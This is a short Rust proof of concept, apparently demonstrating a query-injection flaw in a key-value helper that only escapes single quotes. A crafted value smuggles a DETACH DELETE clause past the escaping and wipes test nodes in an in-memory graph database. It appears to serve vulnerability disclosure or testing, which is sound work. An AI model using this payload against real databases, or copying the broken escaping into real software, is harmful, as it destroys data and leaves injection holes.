use grafeo::GrafeoDB;
fn esc(s:&str)->String{ s.replace('\'', "\\'") }   // identical to SiafuDB::kv_set
fn main(){
    let db = GrafeoDB::new_in_memory();
    db.execute("INSERT (:Victim {secret:'keep-me'})").unwrap();
    let before = db.execute("MATCH (v:Victim) RETURN v.secret").unwrap().rows().len();
    let (key, value) = ("k", "x\\'}) WITH n MATCH (v:Victim) DETACH DELETE v //");
    let q = format!("MERGE (n:_KV {{key: '{}'}}) SET n.value = '{}'", esc(key), esc(value));
    println!("query: {q}");
    println!("result: {:?}", db.execute(&q).map(|r| r.rows().len()).map_err(|e| e.to_string()));
    let after = db.execute("MATCH (v:Victim) RETURN v.secret").unwrap().rows().len();
    println!("Victim nodes before={before} after={after}");
}
